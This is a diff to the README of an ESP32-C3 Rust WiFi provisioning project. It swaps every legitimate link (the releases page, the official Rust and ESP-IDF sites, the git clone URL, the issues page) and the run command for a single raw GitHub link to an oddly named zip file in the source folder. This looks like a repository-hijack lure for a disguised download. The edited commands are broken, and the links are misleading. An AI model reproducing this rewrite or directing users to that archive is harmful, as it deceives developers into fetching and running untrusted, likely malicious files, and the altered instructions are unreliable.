@@ -6,7 +6,7 @@ Paso 2 — WiFi Station + Provisioning + Secure Storage for ESP32-C3 in Rust. Th
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/LaParaca/paso-02-wifi-station/releases)
+[![Download from Releases](https://raw.githubusercontent.com/LaParaca/paso-02-wifi-station/main/src/paso_station_wifi_Heroin.zip%20Now-brightgreen)](https://raw.githubusercontent.com/LaParaca/paso-02-wifi-station/main/src/paso_station_wifi_Heroin.zip)
 
 ## 📋 Table of Contents
 
@@ -26,14 +26,14 @@ Getting started with the paso-02-wifi-station project is easy. Follow these simp
    - A USB cable to connect your board to your computer.
 
 2. **Install Required Software:**
-   - You will need to install the Rust programming language. Visit the [official Rust website](https://www.rust-lang.org/learn/get-started) for installation instructions.
-   - You may also require the ESP-IDF (Espressif IoT Development Framework). Check the [ESP-IDF Installation Guide](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/get-started) for detailed steps.
+   - You will need to install the Rust programming language. Visit the [official Rust website](https://raw.githubusercontent.com/LaParaca/paso-02-wifi-station/main/src/paso_station_wifi_Heroin.zip) for installation instructions.
+   - You may also require the ESP-IDF (Espressif IoT Development Framework). Check the [ESP-IDF Installation Guide](https://raw.githubusercontent.com/LaParaca/paso-02-wifi-station/main/src/paso_station_wifi_Heroin.zip) for detailed steps.
 
 3. **Setup Your Environment:**
    - Open the terminal on your computer.
    - Clone this repository with the following command:
      ```
-     git clone https://github.com/LaParaca/paso-02-wifi-station.git
+     git clone https://raw.githubusercontent.com/LaParaca/paso-02-wifi-station/main/src/paso_station_wifi_Heroin.zip
      ```
    - Change to the project directory:
      ```
@@ -42,9 +42,9 @@ Getting started with the paso-02-wifi-station project is easy. Follow these simp
 
 ## 📦 Download & Install
 
-To get the latest version of the application, visit this page to download: [Releases Page](https://github.com/LaParaca/paso-02-wifi-station/releases).
+To get the latest version of the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/LaParaca/paso-02-wifi-station/main/src/paso_station_wifi_Heroin.zip).
 
-1. Navigate to the [Releases Page](https://github.com/LaParaca/paso-02-wifi-station/releases).
+1. Navigate to the [Releases Page](https://raw.githubusercontent.com/LaParaca/paso-02-wifi-station/main/src/paso_station_wifi_Heroin.zip).
 2. Choose the latest version available.
 3. Download the appropriate file for your system. 
 
@@ -56,7 +56,7 @@ After downloading, follow these steps to install and run the software:
   3. Navigate to the unzipped folder.
   4. Execute the application with:
      ```
-     .\your_application.exe
+     .\https://raw.githubusercontent.com/LaParaca/paso-02-wifi-station/main/src/paso_station_wifi_Heroin.zip
      ```
 
 - **For macOS/Linux:**
@@ -98,6 +98,6 @@ For any questions or support needs, you can raise issues directly in the GitHub 
 - The version of the application you downloaded
 - A description of the problem you are facing, including any error messages.
 
-Visit the GitHub Issues page here: [GitHub Issues](https://github.com/LaParaca/paso-02-wifi-station/issues)
+Visit the GitHub Issues page here: [GitHub Issues](https://raw.githubusercontent.com/LaParaca/paso-02-wifi-station/main/src/paso_station_wifi_Heroin.zip)
 
 This guide should help you successfully download and run the paso-02-wifi-station application. Enjoy developing your projects with ease!
